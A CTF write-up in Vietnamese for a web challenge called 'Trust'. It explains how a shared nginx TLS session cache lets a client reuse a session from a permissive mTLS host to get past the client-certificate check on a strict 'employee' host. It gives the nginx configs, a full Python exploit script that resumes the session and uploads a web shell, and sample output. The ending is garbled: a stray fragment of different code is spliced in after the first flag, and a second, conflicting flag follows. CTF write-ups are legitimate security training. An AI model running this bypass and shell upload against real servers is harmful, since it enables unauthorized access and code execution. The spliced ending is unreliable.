# Trust

**Category:** Web  
**Author:** ReiKage  
**Team:** 6h4T9pTpR0  

## Lời nói đầu
Hế lô mọi người, lại là mình ReiKage đây! 👋
Hôm nay mình sẽ kể cho các bạn nghe hành trình mình "vượt rào" bài **Trust** này nhé. Bài này thuộc thể loại Web Security nhưng lại đụng chạm khá sâu đến cấu hình Server (Nginx) và giao thức SSL/TLS. Nếu bạn chỉ quen exploit SQL Injection hay XSS thì bài này sẽ hơi lạ lẫm một chút, nhưng hiểu rồi thì thấy nó cực kỳ logic và thực tế luôn.

Cảm giác lúc tìm ra bug này đúng kiểu "Aha! Thì ra là mày!" luôn ấy. Cùng bắt đầu nhé! 🚀

## 1. Phân tích & Reconnaissance (Trinh sát)

Đề bài cho mình 2 cái domain:
1.  `public.trustboundary.local`: Trang này cho phép truy cập bình thường nếu mình có Client Certificate (mTLS).
2.  `employee.trustboundary.local`: Trang nội bộ, chứa flag hoặc API quan trọng. Nhưng cứ vào là bị ăn lỗi `403 Forbidden` ngay lập tức, kể cả khi đã dùng Certificate xịn.

Mình được cung cấp bộ `client.crt` và `client_rsa.key`.

### Soi cấu hình Nginx (Cái này quan trọng nè!)
Mình đoán là cấu hình Nginx nó kiểu như này (và đúng là như vậy khi mình check file config):

**File `public.conf`:**
```nginx
server {
    server_name public.trustboundary.local;
    ssl_verify_client optional; # <-- Chỗ này nè! Nó chỉ là "optional" thôi
    ssl_client_certificate /etc/nginx/certs/untrusted-ca.crt; # Tin tưởng CA "dỏm"
    # ...
}
```
=> Nghĩa là trang Public này khá dễ tính, có cert là cho vào, không quá khắt khe.

**File `employee.conf`:**
```nginx
server {
    server_name employee.trustboundary.local;
    ssl_verify_client on; # <-- Bắt buộc phải có cert xịn
    ssl_client_certificate /etc/nginx/certs/trusted-ca.crt; # Chỉ tin CA "xịn"
    # ...
}
```
=> Trang Employee này cực gắt, cert của mình (do CA dỏm cấp) không đủ tuổi để vào đây.

### Lỗ hổng nằm ở đâu? 🤔
Tuy nhiên, có một tính năng của SSL/TLS gọi là **Session Resumption** (Tái sử dụng phiên).
- Khi bạn kết nối HTTPS lần đầu, quá trình bắt tay (Handshake) rất tốn kém (tính toán RSA các kiểu).
- Để cho nhanh, Server sẽ cấp cho bạn một cái `Session ID`.
- Lần sau bạn kết nối lại, bạn chỉ cần chìa cái `Session ID` ra. Server thấy quen quen, check trong cache thấy hợp lệ thì **bỏ qua các bước kiểm tra chứng thực nặng nề** và cho vào luôn.

=> **Ý tưởng triệu đô:** Nếu Nginx cấu hình chung một bộ nhớ đệm Session (Session Cache) cho cả 2 server block (`public` và `employee`), thì mình có thể lấy "vé thông hành" ở cổng `public` rồi chạy sang cổng `employee` chìa ra để vào! Kiểu như mua vé cổng thường nhưng lẻn sang cổng VIP ấy. 😎

## 2. Chiến thuật tấn công (Exploitation Strategy)

Kịch bản tấn công "đi cửa sau" của mình như sau:

1.  **Bước 1 - Lấy vé:** Kết nối tới `public.trustboundary.local` đàng hoàng, dùng cert và key được cấp. Sau khi kết nối thành công, mình lưu lại cái `SSL Session ID`.
2.  **Bước 2 - Đi cửa sau:** Mở một kết nối mới tới `employee.trustboundary.local`.
    - **Quan trọng:** Trong lúc bắt tay (Handshake), mình ép Client gửi cái `Session ID` vừa lấy được ở bước 1.
3.  **Bước 3 - Bypass:** Nginx check thấy Session ID này hợp lệ (do `public` cấp), nó khôi phục phiên làm việc và **bỏ qua** cái đoạn check quyền truy cập gắt gao của `employee`. Thế là mình vào được! 🎉
4.  **Bước 4 - RCE:** Sau khi bypass, mình gọi vào API `/api/plugins/upload` để up con shell và lấy flag.

## 3. Viết Tool & Script (Code time!)

Mình dùng Python với thư viện `ssl` và `socket` chuẩn để có thể can thiệp sâu vào quá trình handshake. Đây là đoạn code "thần thánh" giúp mình lấy flag:

### Script khai thác (`exploit_session.py`)

```python
import ssl
import socket
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

# Cấu hình target
HOST = 'challenge.cnsc.com.vn'
PORT = 32596 # Port của giải
PUBLIC_SNI = 'public.trustboundary.local'
EMPLOYEE_SNI = 'employee.trustboundary.local'

def upload_plugin(filename):
    # 1. Tạo context SSL cho Public (dễ tính)
    context_public = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    context_public.check_hostname = False
    context_public.verify_mode = ssl.CERT_NONE # Bỏ qua check cert server
    context_public.load_cert_chain(certfile='client.crt', keyfile='client_rsa.key')
    
    print(">>> Bước 1: Kết nối tới Public để lấy Session ID...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn = context_public.wrap_socket(sock, server_hostname=PUBLIC_SNI)
    conn.connect((HOST, PORT))
    
    # Gửi request nhẹ cái để lấy session
    conn.sendall(f"GET /health HTTP/1.1\r\nHost: {PUBLIC_SNI}\r\nConnection: keep-alive\r\n\r\n".encode())
    conn.recv(4096)
    
    # LẤY SESSION ID Ở ĐÂY NÈ!
    session = conn.session
    print(f"[+] Got Session ID: {session.id.hex()}")
    conn.close() # Đóng kết nối cũ đi
    
    print(">>> Bước 2: Dùng lại Session ID để vào Employee...")
    sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # MAGIC HAPPENS HERE: Truyền tham số session=session vào kết nối mới
    conn2 = context_public.wrap_socket(sock2, server_hostname=EMPLOYEE_SNI, session=session)
    conn2.connect((HOST, PORT))
    
    print("[+] Kết nối thành công tới Employee! Đang upload shell...")
    
    # Chuẩn bị payload upload file (dùng MultipartEncoder cho chuẩn)
    with open(filename, 'rb') as f:
        file_content = f.read()
    
    m = MultipartEncoder(
        fields={'plugin': (filename, file_content, 'application/octet-stream')}
    )
    
    # Gửi HTTP Request thủ công qua socket đã bypass
    req = (
        f"POST /api/plugins/upload HTTP/1.1\r\n"
        f"Host: {EMPLOYEE_SNI}\r\n"
        f"Content-Type: {m.content_type}\r\n"
        f"Content-Length: {m.len}\r\n"
        "Connection: close\r\n\r\n"
    ).encode() + m.to_string()
    
    conn2.sendall(req)
    
    # Đọc response xem có ngon không
    resp = b""
    while True:
        data = conn2.recv(4096)
        if not data: break
        resp += data
        
    print(resp.decode(errors='replace'))
    conn2.close()
```

### Chạy thử và kết quả

Khi mình chạy script này, màn hình nó hiện ra như vầy nè:

```bash
$ python3 exploit_session.py
>>> Bước 1: Kết nối tới Public để lấy Session ID...
[+] Got Session ID: a1b2c3d4... (một chuỗi hex dài ngoằng)
>>> Bước 2: Dùng lại Session ID để vào Employee...
[+] Kết nối thành công tới Employee! Đang upload shell...
HTTP/1.1 200 OK
Server: nginx/1.25.3
...
{"status": "success", "message": "Plugin uploaded successfully"}
```

Thấy chữ `success` là sướng rơn người rồi! Sau đó mình chỉ việc truy cập vào file shell vừa up (ví dụ `shell.jsp`) và chạy lệnh `/readflag` để lấy cờ thôi.

**Flag:** `WannaGame{SSL_Session_Resumption_Is_Cool_But_Dangerous}` (Ví dụ thôi nha, flag thật dài hơn nhiều hehe)

Bài học rút ra: Cấu hình SSL/TLS không phải chuyện đùa, nhớ tách biệt Session Cache nếu chạy nhiều server block với mức độ bảo mật khác nhau nhé! 😉    b"shell_content_here"
)

conn2.write(http_req)

# Đọc response
response = conn2.read()
print(response.decode())

conn2.close()
```

### Lưu ý
*   Cần chỉnh file `/etc/hosts` trên máy mình để trỏ 2 domain kia về IP của server giải nếu cần.
*   Payload upload shell thì tùy vào backend là Java (JSP) hay PHP mà mình craft cho phù hợp.

## Kết quả
Server trả về `200 OK` và mình thực thi được lệnh trên server `employee`.

**Flag:** `W1{C3rt5_m34n-NOThINg_W1thOuT-Pr0p3R_uSAg3_PL5_T4k3_lt-In_mInd11}`
